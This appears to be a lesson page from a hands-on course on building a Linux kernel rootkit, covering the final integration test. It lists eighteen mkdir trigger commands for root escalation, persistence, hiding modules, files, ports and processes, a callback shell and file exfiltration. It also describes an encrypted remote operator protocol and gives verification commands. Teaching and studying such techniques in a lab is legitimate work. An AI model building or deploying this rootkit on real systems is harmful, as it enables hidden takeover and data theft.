# Everything works locally and remotely, encrypted

This is the final integration milestone. Every feature you have built across
the course must work together: local mkdir commands, remote wire protocol
equivalents, AES-256-GCM encryption, and binary framing.

No new code. Load your complete module and verify the full feature set.

## Local command set (mkdir)

All 18 mkdir commands must work:

| Command | Feature |
|---------|---------|
| `mkdir rklings.e` | Escalate current process to root |
| `mkdir rklings.e.<pid>` | Escalate a specific PID |
| `mkdir rklings.ping` | Liveness check |
| `mkdir rklings.status` | Module status |
| `mkdir rklings.persist` | Write modules-load.d conf |
| `mkdir rklings.unpersist` | Remove persistence conf |
| `mkdir rklings.h.m` | Hide module from lsmod |
| `mkdir rklings.u.m` | Unhide module |
| `mkdir rklings.h.f.<prefix>` | Hide files by prefix |
| `mkdir rklings.u.f.<prefix>` | Unhide files |
| `mkdir rklings.h.c.<string>` | Hide lines containing string |
| `mkdir rklings.u.c.<index>` | Unhide content target |
| `mkdir rklings.h.p.<port>` | Hide port from /proc/net/tcp |
| `mkdir rklings.u.p.<index>` | Unhide port |
| `mkdir rklings.h.i.<pid>` | Hide process from ps |
| `mkdir rklings.u.i.<index>` | Unhide process |
| `mkdir rklings.shell` | Spawn callback shell |
| `mkdir rklings.exfil.<path>` | Exfiltrate file |

## Remote protocol

The same commands are available over the encrypted wire protocol.
An operator connects to the kernel TCP listener and sends commands inside
AES-256-GCM encrypted, length-prefixed binary frames.

The protocol flow:

```text
operator                              rootkit (kernel)
   |                                       |
   +-- TCP connect to listener port ------>|
   |                                       |
   +-- [4-byte length][nonce][ciphertext]-->|
   |       (AES-256-GCM encrypted cmd)     |
   |                                       |
   |<-- [4-byte length][nonce][ciphertext]--+
   |       (AES-256-GCM encrypted reply)   |
```

Each frame carries:
1. 4-byte big-endian length prefix (covers nonce + ciphertext + tag)
2. 12-byte GCM nonce
3. Ciphertext + 16-byte authentication tag

The key is provisioned at module load time via a module parameter.

## Verification walkthrough

### 1. Local commands

Boot the VM and load the module:

    insmod rklings.ko key=<hex-key>

Run through each mkdir command and verify:

    mkdir rklings.e && id
    mkdir rklings.persist && cat /etc/modules-load.d/rklings.conf
    mkdir rklings.h.m && lsmod | grep rklings
    mkdir rklings.h.f.secret && ls
    mkdir rklings.h.c.password && cat /etc/shadow
    mkdir rklings.h.p.4444 && grep 115C /proc/net/tcp

### 2. Remote commands

From the host, connect with the operator tool:

    ./rklings operator --key <hex-key> <vm-ip> <port>

Send each command and verify the encrypted response:

    > ping
    > status
    > escalate
    > hide module
    > hide file secret
    > hide content password
    > hide port 4444

### 3. Encryption verification

Capture traffic with tcpdump and confirm all payloads are encrypted.
No plaintext commands or responses should appear on the wire.

### 4. Clean shutdown

    mkdir rklings.u.m
    mkdir rklings.unpersist
    rmmod rklings
    dmesg | tail -20

No kernel faults, no leaked resources, no orphaned threads.

## Verify

```sh
./rklings check
```

## References

- [Linux v7.2 Crypto API: AEAD][1]
- [Linux v7.2 `call_usermodehelper`][2]
- [Linux v7.2 kernel TCP sockets][3]

[1]: https://github.com/torvalds/linux/blob/v7.2/include/crypto/aead.h
[2]: https://github.com/torvalds/linux/blob/v7.2/kernel/umh.c
[3]: https://github.com/torvalds/linux/blob/v7.2/net/ipv4/tcp.c
